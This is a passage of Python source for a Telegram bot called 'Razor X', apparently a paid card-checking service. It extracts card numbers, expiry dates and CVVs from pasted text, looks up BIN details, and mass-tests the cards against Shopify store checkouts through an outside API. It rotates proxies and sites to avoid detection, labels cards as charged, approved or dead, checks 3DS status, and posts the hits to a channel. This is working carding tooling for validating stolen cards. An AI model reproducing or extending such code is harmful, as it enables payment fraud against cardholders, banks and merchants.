        log_system("STYLED_SEND_ERR", f"Chat={chat_id} Error={repr(e)}", "error")
        return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    for _attempt in range(2):
        try:
            async with _TG_RATE:
                text, entities = build_entities(html_text, emoji_ids)
                await asyncio.wait_for(msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False), timeout=10)
            return
        except FloodWaitError as e:
            await asyncio.sleep(min(e.seconds + 1, 15))
        except Exception as e:
            log_system("STYLED_EDIT_ERR", f"Error={repr(e)}", "error")
            return


def pbtn(text, data=None, url=None, color=None, icon=None):
    style = None
    if color == "blue":
        style = "primary"
    elif color == "green":
        style = "success"
    elif color == "red":
        style = "danger"
        
    if url:
        return Button.url(text, url, style=style)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data, style=style, icon=icon)
    return Button.inline(text, b"none", style=style, icon=icon)

def get_hit_button(status=None, is_channel=False):
    if is_channel:
        color = "blue"
    elif not status:
        color = "blue"
    else:
        s = status.lower()
        if "charged" in s:
            color = "blue"
        elif "approved" in s:
            color = "green"
        elif "declined" in s:
            color = "red"
        else:
            color = "blue"
    return [[pbtn(bs("Razor X"), url=BOT_LINK, color=color)]]


# ====================== STATUS EMOJI HELPER ======================
def get_status_emoji_id(status):
    import random
    s = status.upper()
    if s == "CHARGED":
        return random.choice(CHARGED_EMOJIS)
    elif s == "APPROVED":
        return CE["approved"]
    else:
        return CE["declined"]


# ====================== EXTRACT GATEWAY FROM API ======================
def extract_gateway_from_api(rj):
    gw = rj.get('Gateway', '')
    if gw and str(gw).strip() not in ('', '-', 'null', 'None', 'unknown', 'Unknown', 'UNKNOWN'):
        return str(gw).strip()
    gw2 = rj.get('gateway', '')
    if gw2 and str(gw2).strip() not in ('', '-', 'null', 'None', 'unknown', 'Unknown', 'UNKNOWN'):
        return str(gw2).strip()
    gw3 = rj.get('Gate', '')
    if gw3 and str(gw3).strip() not in ('', '-', 'null', 'None', 'unknown', 'Unknown', 'UNKNOWN'):
        return str(gw3).strip()
    gw4 = rj.get('gate', '')
    if gw4 and str(gw4).strip() not in ('', '-', 'null', 'None', 'unknown', 'Unknown', 'UNKNOWN'):
        return str(gw4).strip()
    return 'Shopify Payments'


# ====================== UNIFIED UI FORMATTERS (SANS BOLD, NO HTML TAGS) ======================
def format_single_result(status, card, gateway, response, bin_info=None, user_name="User", user_link="#", user_tag="TRIAL", proxy_status=None):
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    proxy_line = ""
    if proxy_status:
        proxy_line = f" / {bs('Proxy')} ➛ {bs(proxy_status)} {PE}"
    return f"""{bs('Status')} ➛ {bs(status.upper())} {PE}
{PE} ➛ <code>{card}</code>
{bs('Gateway')} ➛ {bs(gateway)}
{bs('Response')} ➛ {bs(response)}
{bs('Brand')} ➛ {bs(bi.get('brand', '-'))}
{bs('Issuer')} ➛ {bs(bi.get('bank', '-'))}
{bs('Country')} ➛ {bi.get('flag', '🏳️')} {bs(bi.get('country', '-'))}
{bs('User')} ➛ <a href="{user_link}">{html.escape(bs(user_name))}</a> ({bs(user_tag)})
{bs('Dev')} ➛ {DEV_TAG}{proxy_line}"""


def format_mass_hit_dm(status, card, gateway, response, bin_info=None, user_name="User", user_link="#", user_tag="TRIAL", proxy_status=None):
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    proxy_line = ""
    if proxy_status:
        proxy_line = f" / {bs('Proxy')} ➛ {bs(proxy_status)} {PE}"
    return f"""{bs('Status')} ➛ {bs(status.upper())} {PE}
{PE} ➛ <code>{card}</code>
{bs('Gateway')} ➛ {bs(gateway)}
{bs('Response')} ➛ {bs(response)}
{bs('Brand')} ➛ {bs(bi.get('brand', '-'))}
{bs('Issuer')} ➛ {bs(bi.get('bank', '-'))}
{bs('Country')} ➛ {bi.get('flag', '🏳️')} {bs(bi.get('country', '-'))}
{bs('User')} ➛ <a href="{user_link}">{html.escape(bs(user_name))}</a> ({bs(user_tag)})
{bs('Dev')} ➛ {DEV_TAG}{proxy_line}"""


def format_channel_hit(status, gateway, response, user_name, user_link, user_tag, price=None, status_emoji_id=None):
    arrow_id = 5447181973544008180
    hit_emoji_id = 5447453226498552490
    emoji_list = [hit_emoji_id, arrow_id, status_emoji_id]
    
    price_line = ""
    if price and price != "-":
        price_line = f"\n{bs('Price')} ➛ {bs(price)}"
        
    text = f"""{PE} {PE} {bs(status.upper())} {PE}
{bs('Gateway')} {PE} {bs(gateway)}
{bs('Response')} {PE} {bs(response)}{price_line}
{bs('User')} {PE} <a href="{user_link}">{html.escape(bs(user_name))}</a> ({bs(user_tag)})"""

    emoji_list.extend([arrow_id, arrow_id])
    emoji_list.append(arrow_id)
    
    return text, emoji_list


def format_mass_progress(gate_name, status_label, checked, total, approved, charged, declined, errors, elapsed_str, session_id):
    return f"""{bs('Gateway')} ➛ {bs(gate_name)}
{bs('Status')} ➛ {bs(status_label)} {PE}
{bs('Checked')} ➛ {bs(str(checked))}/{bs(str(total))}
{bs('Approved')} ➛ {bs(str(approved))} {PE}
{bs('CHARGED')} ➛ {bs(str(charged))} {PE}
{bs('Dead')} ➛ {bs(str(declined))} {PE}
{bs('Errors')} ➛ {bs(str(errors))} ⚠️
{bs('Time')} ➛ {bs(elapsed_str)}
🛠️ {bs('Dev')} ➛ <a href='{DEV_LINK}'>{bs('Raven')}</a>
{bs('Session ID')} ➛ <code>{session_id}</code>"""


def get_mass_progress_emojis(status_label):
    if status_label == "CHECKING":
        status_eid = CE["bolt"]
    elif status_label == "FINISHED":
        status_eid = CE["approved"]
    else:
        status_eid = CE["declined"]
    return [status_eid, CE["approved"], CE["charged"], CE["declined"]]


def make_mass_buttons(approved, charged, declined, total):
    if charged > 0:
        color = "blue"
    elif approved > 0:
        color = "green"
    else:
        color = "red"
    return [
        [pbtn(bs("Razor X"), url=BOT_LINK, color=color)]
    ]


SH_MAX_CARDS = 15
SH_CARDS_PER_PAGE = 10
SH_COMPLETE_EMOJI = 4958610528588008305


def _sh_format_response_label(response):
    resp = str(response or "").strip()
    if not resp:
        return "UNKNOWN"
    rl = resp.lower().replace("_", " ")
    if any(k in rl for k in ("3ds", "otp", "authentication", "3d redirect", "3d required")):
        return "3DS REQUIRED"
    if "insufficient" in rl and "fund" in rl:
        return "INSUFFICIENT FUNDS"
    if "ccn" in rl:
        return "CCN LIVE"
    if "cvc" in rl:
        return "CVC MATCH"
    return resp.upper().replace("_", " ")[:60]


def _sh_status_label(status, response=""):
    resp = str(response or "").lower()
    if status == "Charged":
        return "CHARGED", CE["charged"]
    if status == "Approved":
        return _sh_format_response_label(response), CE["approved"]
    if status in ("Error", "SiteError"):
        return _sh_format_response_label(response) if response else "ERROR", CE["cross"]
    return "CARD DECLINED", CE["declined"]


def _sh_format_bin_line(bi):
    brand = str(bi.get("brand") or "-").strip()
    bank = str(bi.get("bank") or "-").strip()
    if bank.lower() in ("none", "null", ""):
        bank = "-"
    country = str(bi.get("country") or "-").strip()
    flag = bi.get("flag", "🏳️")
    info_text = html.escape(f"{brand} - {bank} - {country}")
    return f"{bs('INFO')} \u2192 <code>{info_text}</code> {flag}"


def _sh_total_pages(result_count):
    if result_count <= 0:
        return 1
    return (result_count + SH_CARDS_PER_PAGE - 1) // SH_CARDS_PER_PAGE


def format_sh_message(session, page_index):
    results = session["results"]
    total = session["total"]
    checked = len(results)
    elapsed = format_elapsed(time.time() - session["start"])
    uid = session["user_id"]
    user_link = user_link_html(uid, session.get("name") or "User")
    emoji_ids = []

    if checked == 0 and not session.get("done"):
        text = (
            f"{bs('Total Cards')} \u2794 <code>{total}</code>\n"
            f"{bs('Elapsed')} \u2794 <code>0.0s</code>\n\n"
            f"<pre>{bs('Starting Mass Check')} \u23f3 ...</pre>"
        )
        return text, emoji_ids

    total_pages = _sh_total_pages(checked) if checked else 1
    page_index = max(0, min(page_index, total_pages - 1))
    page_results = results[page_index * SH_CARDS_PER_PAGE:(page_index + 1) * SH_CARDS_PER_PAGE]

    lines = [
        f"{bs('TOTAL CARDS')} \u2192 <code>{checked}/{total}</code>",
        f"{bs('TIME')} \u2192 <code>{elapsed}</code>",
        f"{bs('USER')} \u2192 {user_link}",
        "\u2501" * 22,
    ]
    for item in page_results:
        label, eid = _sh_status_label(item["status"], item.get("response", ""))
        bi = item.get("bin_info") or {}
        lines.append(f"<code>{html.escape(item['card'])}</code>")
        lines.append(f"{bs(label)} {PE}")
        emoji_ids.append(eid)
        lines.append(_sh_format_bin_line(bi))
        lines.append("\u2501" * 22)

    if session.get("done") and page_index == total_pages - 1:
        lines.append(f"{bs('CHECK COMPLETE.')} {PE}")
        emoji_ids.append(SH_COMPLETE_EMOJI)

    return "\n".join(lines), emoji_ids


def build_sh_buttons(session_id, page_index, result_count, done=False):
    total_pages = _sh_total_pages(result_count) if result_count else 1
    page_index = max(0, min(page_index, total_pages - 1))
    if total_pages <= 1 and not done:
        return None
    nav = []
    if page_index > 0:
        nav.append(pbtn("\u00ab Back", f"sh_page:{session_id}:{page_index - 1}", color="blue"))
    if total_pages > 1:
        nav.append(pbtn(f"{page_index + 1} / {total_pages}", f"sh_nop:{session_id}"))
    if page_index < total_pages - 1:
        nav.append(pbtn("Next \u00bb", f"sh_page:{session_id}:{page_index + 1}", color="blue"))
    return [nav] if nav else None


async def _edit_sh_message(msg, session, page_index=None, force_latest=False):
    if page_index is None:
        page_index = session.get("view_page", 0)
    if not session.get("done") and force_latest:
        page_index = max(page_index, _sh_total_pages(len(session["results"])) - 1)
    session["view_page"] = page_index
    text, emoji_ids = format_sh_message(session, page_index)
    buttons = build_sh_buttons(
        session["session_id"],
        page_index,
        len(session["results"]),
        done=session.get("done", False),
    )
    await styled_edit(msg, text, buttons=buttons, emoji_ids=emoji_ids or None)
    try:
        await save_sh_session(session)
    except Exception:
        pass


def format_elapsed(seconds):
    h = int(seconds) // 3600
    m = (int(seconds) % 3600) // 60
    s = int(seconds) % 60
    if h > 0:
        return f"{h}{bs('h')} {m}{bs('m')} {s}{bs('s')}"
    elif m > 0:
        return f"{m}{bs('m')} {s}{bs('s')}"
    else:
        return f"{s}{bs('s')}"


# ====================== FORCE JOIN ======================
async def check_membership_via_http(chat_id: int, user_id: int):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": chat_id, "user_id": user_id}
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("ok"):
                        return data["result"].get("status")
        return None
    except Exception as e:
        log_system("FORCE_JOIN", f"HTTP membership check failed for {chat_id}: {e}", "warning")
        return None


async def safe_get_member(chat_id, user_id):
    """Returns True if joined, False if not, None if verification failed."""
    try:
        r = await asyncio.wait_for(
            client_instance(GetParticipantRequest(channel=chat_id, participant=user_id)),
            timeout=10,
        )
        if isinstance(r.participant, ChannelParticipantLeft):
            log_system("FORCE_JOIN", f"User {user_id} not active in {chat_id}: {type(r.participant).__name__}", "warning")
            return False
        if isinstance(r.participant, ChannelParticipantBanned):
            if r.participant.banned_rights and r.participant.banned_rights.view_messages:
                log_system("FORCE_JOIN", f"User {user_id} kicked from {chat_id}: {type(r.participant).__name__}", "warning")
                return False
            else:
                log_system("FORCE_JOIN", f"User {user_id} restricted/muted in {chat_id} but still member, allowing")
                return True
        log_system("FORCE_JOIN", f"User {user_id} in {chat_id}: {type(r.participant).__name__}")
        return True
    except UserNotParticipantError:
        log_system("FORCE_JOIN", f"User {user_id} NOT in {chat_id}", "warning")
        return False
    except Exception as e:
        # Fall back to Telegram Bot HTTP API to bypass all MTProto entity caching limitations
        log_system("FORCE_JOIN", f"MTProto check failed for {chat_id} (Error: {e}). Trying HTTP Bot API fallback...", "warning")
        try:
            status = await check_membership_via_http(chat_id, user_id)
            if status in ("creator", "administrator", "member", "restricted"):
                log_system("FORCE_JOIN", f"HTTP Success: User {user_id} in {chat_id} (Status: {status})")
                return True
            elif status in ("left", "kicked"):
                log_system("FORCE_JOIN", f"HTTP Success: User {user_id} NOT in {chat_id} (Status: {status})", "warning")
                return False
            else:
                log_system("FORCE_JOIN", f"HTTP Check returned unknown status {status} for {chat_id}", "warning")
        except Exception as ex:
            log_system("FORCE_JOIN", f"HTTP fallback failed for {chat_id}: {ex}", "warning")
        return None


async def is_user_joined(user_id):
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached = _JOIN_CACHE.get(user_id)
    if cached and now - cached < 600:
        return True

    group_ok = await safe_get_member(JOIN_GROUP_ID, user_id)
    logs_ok = await safe_get_member(LOGS_CHANNEL_ID, user_id)
    hits_ok = await safe_get_member(HITS_CHANNEL_ID, user_id)

    if group_ok is False or logs_ok is False or hits_ok is False:
        await remove_joined_mark(user_id)
        _JOIN_CACHE.pop(user_id, None)
        return False
    
    if group_ok is True and logs_ok is True and hits_ok is True:
        await mark_user_joined(user_id)
        _JOIN_CACHE[user_id] = now
        return True

    # Telegram API could not verify — trust a prior successful "I have joined" check
    if await is_user_marked_joined(user_id):
        return True

    return False


async def force_join_check(event):
    if event.sender_id in ADMIN_ID:
        return True
    if getattr(event, "raw_text", None) and re.match(r'(?i)^[/.]start\b', event.raw_text.strip()):
        return True
    if await is_user_joined(event.sender_id):
        return True
    buttons = [
        [pbtn(bs("Join Logs Channel"), url=LOGS_CHANNEL_LINK, color="blue")],
        [pbtn(bs("Join Hits Channel"), url=HITS_CHANNEL_LINK, color="blue")],
        [pbtn(bs("Join Group"), url=JOIN_GROUP_LINK, color="blue")],
        [pbtn(bs("I have joined"), data="check_joined", color="green")]
    ]
    text = f"""{bs('Access Locked')} {PE}
━━━━━━━━━━━━━━━━━
{PE} {bs('Join All Three to Unlock')}
{PE} {bs('Logs')} ━ {bs('Razor X Logs')}
{PE} {bs('Hits')} ━ {bs('Razor X Hits')}
{PE} {bs('Group')} ━ {bs('Razor X Chat')}
━━━━━━━━━━━━━━━━━
{PE} {bs('All Features Restricted')}"""
    await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["stop"], CE["link"], CE["link"], CE["link"], CE["warn"]])
    return False


# ====================== ACCESS ======================
async def can_use(user_id, chat):
    try:
        sender = await client_instance.get_entity(user_id)
        username = getattr(sender, 'username', None)
        name = getattr(sender, 'first_name', None) or username or f"user_{user_id}"
        await ensure_user(user_id, name=name, username=username)
    except Exception:
        await ensure_user(user_id)
    if await is_banned_user(user_id):
        return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"


async def get_user_access(event):
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = getattr(sender, 'username', None)
        name = getattr(sender, 'first_name', None) or getattr(sender, 'last_name', None) or username or f"user_{uid}"
        await ensure_user(uid, name=name, username=username)
    except Exception:
        await ensure_user(uid)
    if await is_banned_user(uid):
        return False, "banned", FREE_PLAN
    plan = (await get_user_plan(uid)).title()
    return True, f"{plan}_private" if event.chat.id == uid else f"{plan}_group", plan


def get_cc_limit(plan, uid=None):
    """Mass-check card limit. Single gates (/sp, etc.) are not capped by this."""
    if uid and uid in ADMIN_ID:
        return 10000
    p = plan.title() if plan else FREE_PLAN
    if p in (FREE_PLAN, "Bronze"):
        return 0
    if p == "Custom":
        return 2000  # key plan: mass only
    if p == "X":
        return 10000
    if p == "Root":
        return 6500
    if p == "Elite":
        return 4500
    if p == "Core":
        return 2500
    return 0


def is_paid_plan(plan):
    return plan.title() in PAID_TIERS if plan else False


def is_owner(uid) -> bool:
    return uid in ADMIN_ID


async def send_owner_only_message(event):
    return await styled_reply(
        event,
        f"{PE} {bs('Owner only command!')}",
        emoji_ids=[5042112436648281096],
    )


async def get_owner_proxies(gate: str = "shopify"):
    """Owner proxies for one gate pool (shopify)."""
    for admin_id in ADMIN_ID:
        try:
            proxies = await get_all_user_proxies(admin_id, gate=gate)
        except Exception:
            proxies = []
        if proxies:
            return proxies
    return []


async def get_owner_check_resources(proxy_gate: str = "shopify"):
    """Shopify sites (shared pool) + owner proxies for the chosen gate."""
    sites = []
    try:
        sites = await get_shopify_sites()
    except Exception:
        sites = []
    proxies = await get_owner_proxies(proxy_gate)
    return sites or [], proxies or []


def format_premium_time_left(expiry) -> str:
    if not expiry:
        return "0d 0h"
    now = datetime.utcnow()
    if expiry.tzinfo is not None:
        now = datetime.now(expiry.tzinfo)
    delta = expiry - now
    total_seconds = max(0, int(delta.total_seconds()))
    days = total_seconds // 86400
    hours = (total_seconds % 86400) // 3600
    return f"{days}d {hours}h"


async def send_group_only_message(event):
    return await styled_reply(event, f"""{bs('Group Only')} {PE}
{PE} {bs('Free users')} → {bs('group only')}
{PE} {bs('Upgrade for private access')}""", emoji_ids=[CE["stop"], CE["warn"], CE["gem"]])


async def send_premium_only_message(event):
    return await styled_reply(event, f"""{bs('Premium Only')} {PE}
{PE} {bs('This feature requires an active plan')}
{PE} {bs('Use /plan to see available plans')}""", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/ravenu899")]], emoji_ids=[CE["stop"], CE["warn"], CE["info"]])


def banned_user_message():
    return f"""{bs('Banned')} {PE}
{PE} {bs('Not allowed')}
{PE} {bs('Appeal')} ━ {bs('Contact Admin')}""", [CE["stop"], CE["warn"], CE["info"]]


# ====================== UTILITIES ======================
def extract_cc(text):
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))


def extract_urls_from_text(text):
    """Pull every site URL/domain from free-form text.

    Supports multiple URLs on one line, newlines, commas/pipes, with or without
    https://. Previous logic only kept the first https URL per line, so pasted
    multi-URL messages lost sites.
    """
    if not text:
        return []
    seen, result = set(), []

    def _add(raw):
        raw = str(raw or "").strip()
        if not raw:
            return
        # Trim common trailing junk from pasted chat text / markdown
        raw = raw.rstrip(".,;:!?)>]}\"'" )
        raw = raw.lstrip("<([\"'")
        if not raw:
            return
        norm = normalize_site_url(raw)
        if norm and is_valid_url_or_domain(norm) and norm not in seen:
            seen.add(norm)
            result.append(norm)

    # 1) Every explicit http(s) URL anywhere in the blob (multi-per-line OK)
    for m in re.finditer(r"https?://[^\s<>\"'\)\]\}]+", str(text), flags=re.IGNORECASE):
        _add(m.group(0))

    # 2) Bare host or host/path tokens (no scheme) between separators
    for token in re.split(r"[\s,|;]+", str(text)):
        token = token.strip()
        if not token:
            continue
        low = token.lower()
        if low.startswith(("http://", "https://", "/add", ".add")):
            continue
        # Drop list markers / leading junk: "1. site.com", "- site.com"
        token = re.sub(r"^[\s\-\+\|,\d\.\)\(\[\]]+", "", token).split("{")[0].strip()
        if token and "." in token:
            _add(token)

    return result


def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm:
        pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535:
            h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}


async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with _PROXY_SEM:
            async with s.get('http://api.ipify.org?format=json', proxy=proxy_url) as r:
                if r.status == 200:
                    return True, (await r.json()).get('ip', '?')
                return False, None
    except Exception as e:
        return False, str(e)


async def get_bin_info(cn):
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                if r.status != 200:
                    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                d = await r.json(content_type=None)
                return {"brand": d.get('brand', '-'), "type": d.get('type', '-'), "level": d.get('level', '-'), "bank": d.get('bank', '-'), "country": d.get('country_name', '-'), "flag": d.get('country_flag', '🏳️')}
    except Exception:
        return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}


def _format_vbv_card(card: str) -> Optional[str]:
    parts = card.split('|')
    if len(parts) < 4:
        return None
    cn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    return f"{cn}|{mm}|20{yy}|{cvv}"


def _parse_vbv_status(api_response: dict) -> tuple:
    if not api_response.get("success", False):
        return "Error", "API request failed"
    data = api_response.get("data", {})
    status = data.get("status", "unknown")
    response_text = status.replace("_", " ").title()
    status_lower = status.lower()
    if "successful" in status_lower:
        return "Approved", response_text
    if "frictionless" in status_lower or "failed" in status_lower:
        return "Declined", response_text
    return "Declined", response_text or "VBV Required"


async def check_vbv_api(card: str) -> dict:
    formatted = _format_vbv_card(card)
    if not formatted:
        return {"card": card, "Gateway": "3DS Lookup", "Response": "Invalid card format", "Status": "Error"}

    max_retries = 3
    last_error = None
    for attempt in range(max_retries):
        try:
            timeout = aiohttp.ClientTimeout(total=45)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                url = f"{VBV_API_URL}?key={VBV_API_KEY}&card={formatted}"
                async with session.get(url) as response:
                    if response.status != 200:
                        error_text = await response.text()
                        log.warning(f"VBV API attempt {attempt+1}/{max_retries} status {response.status}: {error_text[:200]}")
                        last_error = f"HTTP_{response.status}"
                        if attempt < max_retries - 1:
                            await asyncio.sleep(2 ** attempt)
                            continue
                        return {"card": card, "Gateway": "3DS Lookup", "Response": last_error, "Status": "Error"}
                    api_response = await response.json(content_type=None)
                    log.info(f"VBV API response for {card[:6]}******: {json.dumps(api_response)[:500]}")
                    if not api_response.get("success", False) and attempt < max_retries - 1:
                        log.warning(f"VBV API attempt {attempt+1}/{max_retries} returned success=false, retrying...")
                        await asyncio.sleep(2 ** attempt)
                        continue
            status, response_text = _parse_vbv_status(api_response)
            return {"card": card, "Gateway": "3DS Lookup", "Response": response_text, "Status": status}
        except asyncio.TimeoutError:
            log.warning(f"VBV API attempt {attempt+1}/{max_retries} timed out")
            last_error = "Timeout"
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
                continue
            return {"card": card, "Gateway": "3DS Lookup", "Response": "Timeout", "Status": "Error"}
        except json.JSONDecodeError:
            log.warning(f"VBV API attempt {attempt+1}/{max_retries} invalid JSON")
            last_error = "Invalid JSON"
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
                continue
            return {"card": card, "Gateway": "3DS Lookup", "Response": "Invalid JSON", "Status": "Error"}
        except Exception as e:
            log.error(f"VBV check error attempt {attempt+1}/{max_retries}: {e}")
            last_error = str(e)[:80]
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
                continue
            return {"card": card, "Gateway": "3DS Lookup", "Response": last_error, "Status": "Error"}
    return {"card": card, "Gateway": "3DS Lookup", "Response": last_error or "Unknown error", "Status": "Error"}


def user_profile_url(uid) -> str:
    """Reliable profile open link (works even when t.me/username fails)."""
    return f"tg://user?id={int(uid)}"


def user_link_html(uid, name) -> str:
    """Clickable HTML mention that opens the user's Telegram profile."""
    display = html.escape(bs(str(name or "User")))
    return f'<a href="{user_profile_url(uid)}">{display}</a>'


async def get_user_info(uid):
    try:
        sender = await client_instance.get_entity(uid)
        username = getattr(sender, 'username', None) or f"user_{uid}"
        name = getattr(sender, 'first_name', None) or username
    except Exception:
        username, name = f"user_{uid}", "User"
    prem = await is_premium_user(uid)
    tag = "Premium" if prem else "TRIAL"
    # Always use tg://user?id= — https://t.me/username often fails to open from channels/DMs
    prof = user_profile_url(uid)
    return name, username, tag, prof


# ====================== SHOPIFY API ======================
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'):
        site = f'https://{site}'
    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url


def classify_response(rj):
    ar = str(rj.get('Response', ''))
    if ar.upper() == 'DS_REQUIRED':
        ar = '3DS_REQUIRED'
    st = rj.get('Status', False)
    price = rj.get('Price', '-')
    gw = extract_gateway_from_api(rj)
    if price is not None and price != '-':
        price = f"${price}"
    rl = ar.lower()
    if is_site_error(ar) or is_proxy_error(ar):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    ch = ['order_paid', 'order_placed', 'order confirmed', 'order_confirmed', 'thank you', 'payment successful', 'order completed', 'charged', 'order_created']
    if any(k in rl for k in ch):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
    ap = ['otp_required', 'otp required', '3d_authentication', '3ds_required', '3d required', '3d_redirect', 'authentication_required', 'insufficient_funds', 'insufficient funds', 'cvc', 'ccn', 'ccn live cvv']
    if any(k in rl for k in ap):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    dc = ['generic_decline', 'generic decline', 'do_not_honor', 'do not honor', 'stolen_card', 'lost_card', 'pickup_card', 'pick_up_card', 'restricted_card', 'restricted card', 'fraudulent', 'fraud suspected', 'fraud_suspected', 'expired_card', 'expired card', 'transaction_not_allowed', 'transaction not allowed', 'card_declined', 'card declined', 'processor_declined', 'processor declined', 'card_not_supported', 'card not supported', 'currency_not_supported', 'duplicate_transaction', 'revocation_of_authorization', 'no_action_taken', 'try_again_later', 'not_permitted', 'decline', 'your card was declined', 'payment_intent_authentication_failure', 'avs_check_failed', 'incorrect number', 'incorrect_number', 'invalid', 'invalid_number', 'decision_rule_block', 'generic_error']
    if any(k in rl for k in dc):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
    if st is True and not any(w in rl for w in ["decline", "denied", "failed", "error", "rejected", "refused", "fraud"]):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}


async def check_card_api(card, site, proxy_data=None, user_id=None, session_getter=None):
    uid = user_id or "?"
    try:
        api_site = site if site.startswith('http') else f'https://{site}'
        url = build_api_url(api_site, card, proxy_data)
        getter = session_getter or get_sp_session
        s = await getter()
        log_user(uid, "API_REQ", f"Card={card} | Site={site}")
        async with s.get(url) as r:
            if r.status != 200:
                log_user(uid, "API_HTTP_ERR", f"Card={card} | Site={site} | Status={r.status}", "warning")
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "Shopify Payments", "Status": "SiteError", "card": card, "site": site}
            try:
                rj = await r.json(content_type=None)
            except Exception:
                return {"Response": "Invalid JSON", "Price": "-", "Gateway": "Shopify Payments", "Status": "SiteError", "card": card, "site": site}
        log_user(uid, "API_RAW", f"Card={card} | Gateway={rj.get('Gateway', 'MISSING')} | Response={rj.get('Response', '')}")
        result = classify_response(rj)
        result["card"] = card
        result["site"] = site
        log_user(uid, "API_RESP", f"Card={card} | Status={result['Status']} | Gateway={result['Gateway']} | Response={result['Response']} | Price={result.get('Price', '-')}")
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "Shopify Payments", "Status": "SiteError", "card": card, "site": site}
    except Exception as e:
        err = str(e)
        st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response": err[:100], "Price": "-", "Gateway": "Shopify Payments", "Status": st2, "card": card, "site": site}


async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, session_getter=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
    tried_sites, tried_proxies, last = set(), set(), None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
        site = rotator.pick_site(sites, exclude=tried_sites) if rotator else random.choice([s for s in sites if s not in tried_sites] or list(sites))
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies) if rotator else random.choice([p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data))
            if proxy_data:
                tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_card_api(card, site, proxy_data, user_id, session_getter=session_getter)
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data:
                    rotator.report_proxy_ok(proxy_data.get('proxy_url'))
